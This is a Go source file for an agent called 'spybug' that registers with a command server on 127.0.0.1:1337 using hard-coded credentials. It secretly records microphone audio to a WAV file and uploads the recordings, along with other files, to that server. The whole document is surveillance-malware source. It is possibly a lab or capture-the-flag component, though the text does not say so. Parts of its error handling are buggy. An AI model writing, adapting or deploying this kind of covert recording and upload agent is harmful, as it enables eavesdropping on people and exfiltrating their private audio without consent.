package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/gordonklaus/portaudio"
	wave "github.com/zenwerk/go-wave"
)

type Creds struct {
	ID    string `json:"identifier"`
	Token string `json:"token"`
}

func checkFile(filePath string) bool {
	var result bool

	if _, err := os.Stat(filePath); err == nil {
		if err != nil {
			result = false
		} else {
			result = true
		}
	}

	return result
}

func readFromConfigFile(filePath string) []string {
	var result []string
	data, err := ioutil.ReadFile(filePath)

	if err == nil {
		var fileContents string = string(data)
		result = strings.Split(fileContents, ":")
	} else {
		result = append(result, "invalid")
		result = append(result, "invalid")
	}

	return result
}

func writeToConfigFile(filePath string, id string, token string) {
	f, _ := os.Create(filePath)

	defer f.Close()

	var str = id + ":" + token
	f.WriteString(str)
}

func checkConnection(apiURL string) bool {
	var result bool = false

	client := &http.Client{}
	req, _ := http.NewRequest("GET", apiURL, nil)

	resp, err := client.Do(req)

	if err == nil {
		if resp.StatusCode == 200 {
			result = true
		}
	}

	return result
}

func registerAgent(apiURL string) []string {
	var registerAgentURL string = apiURL + "/agents/register"
	var result []string

	client := &http.Client{}
	req, _ := http.NewRequest("GET", registerAgentURL, nil)
	resp, err := client.Do(req)

	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			var decodedJSON Creds
			responseBytes, _ := ioutil.ReadAll(resp.Body)
			json.Unmarshal(responseBytes, &decodedJSON)
			result = append(result, decodedJSON.ID)
			result = append(result, decodedJSON.Token)
		}
	}

	return result
}

func checkAgent(apiURL string, id string, token string) bool {
	var result bool = false
	var checkAgentURL string = apiURL + "/agents/check/" + id + "/" + token

	client := &http.Client{}
	req, _ := http.NewRequest("GET", checkAgentURL, nil)

	resp, _ := client.Do(req)

	if resp.StatusCode == 200 {
		result = true
	}

	return result
}

func updateDetails(apiURL string, id string, token string) {
	var updateURL string = apiURL + "/agents/details/" + id + "/" + token

	requestBody, _ := json.Marshal(map[string]string{
		"hostname": "",
		"platform": "",
		"arch":     "",
	})

	client := &http.Client{}
	req, _ := http.NewRequest("POST", updateURL, bytes.NewReader(requestBody))
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)

	if err == nil {
		defer resp.Body.Close()
	}
}

func recordingRoutine(apiURL string, id string, token string, audioPath string) {
	var uploadURL string = apiURL + "/agents/upload/" + id + "/" + token

	waveFile, _ := os.Create(audioPath)

	var inputChannels int = 1
	var outputChannels int = 0
	var sampleRate int = 44100
	framesPerBuffer := make([]byte, 64)

	portaudio.Initialize()

	stream, _ := portaudio.OpenDefaultStream(inputChannels, outputChannels, float64(sampleRate), len(framesPerBuffer), framesPerBuffer)

	param := wave.WriterParam{
		Out:           waveFile,
		Channel:       inputChannels,
		SampleRate:    sampleRate,
		BitsPerSample: 8,
	}

	waveWriter, _ := wave.NewWriter(param)

	go func() {
		endTimeStamp := time.Now().Unix() + 5

		for {
			nowTimeStamp := time.Now().Unix()

			if nowTimeStamp > endTimeStamp {
				waveWriter.Close()
				stream.Close()
				portaudio.Terminate()

				client := &http.Client{
					Timeout: time.Second * 10,
				}

				body := &bytes.Buffer{}
				writer := multipart.NewWriter(body)
				fw, _ := writer.CreateFormFile("recording", audioPath)
				file, _ := os.Open(audioPath)

				io.Copy(fw, file)
				writer.Close()

				req, _ := http.NewRequest("POST", uploadURL, bytes.NewReader(body.Bytes()))
				req.Header.Set("Content-Type", writer.FormDataContentType())
				resp, err := client.Do(req)
				if err != nil {
					defer resp.Body.Close()
				}

				break
			}
		}
	}()

	rand.Seed(time.Now().UnixNano())
	stream.Start()

	for {
		err := stream.Read()
		if err != nil {
			break
		}

		_, err = waveWriter.Write([]byte(framesPerBuffer))
		if err != nil {
			break
		}
	}
	stream.Stop()
}

func uploadFile(apiURL string, id string, token string, filePath string) {
	var uploadURL string = apiURL + "/agents/upload/" + id + "/" + token

	client := &http.Client{
		Timeout: time.Second * 10,
	}

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	fw, _ := writer.CreateFormFile("recording", filePath)
	file, _ := os.Open(filePath)

	io.Copy(fw, file)
	writer.Close()

	req, _ := http.NewRequest("POST", uploadURL, bytes.NewReader(body.Bytes()))
	req.Header.Set("Content-Type", writer.FormDataContentType())
	resp, err := client.Do(req)

	// Read body response
	if err != nil {
		fmt.Println("Error uploading file")
		defer resp.Body.Close()
	}

	defer resp.Body.Close()

	var bodyBytes []byte
	resp.Body.Read(bodyBytes)
	fmt.Println(bodyBytes)
}

func main() {
	const configPath string = "/tmp/spybug.conf"
	const audioPath string = "rec.wav"
	const apiURL string = "http://127.0.0.1:1337"

	var apiConnection bool = checkConnection(apiURL)
	fmt.Println("Heere")

	if apiConnection {

		var credidentials [2]string = [2]string{"6eacab50-59ec-43fc-b389-054a762e9b9d", "9612de50-7270-4629-bf7c-aceddd3fec06"}
		var credsValidated = checkAgent(apiURL, credidentials[0], credidentials[1])
		fmt.Println("Creds are validated ", credsValidated)
		if credsValidated {

			uploadFile(apiURL, credidentials[0], credidentials[1], "rec.wav")

			fmt.Println("Heere verifying creds")
		}
	}
}
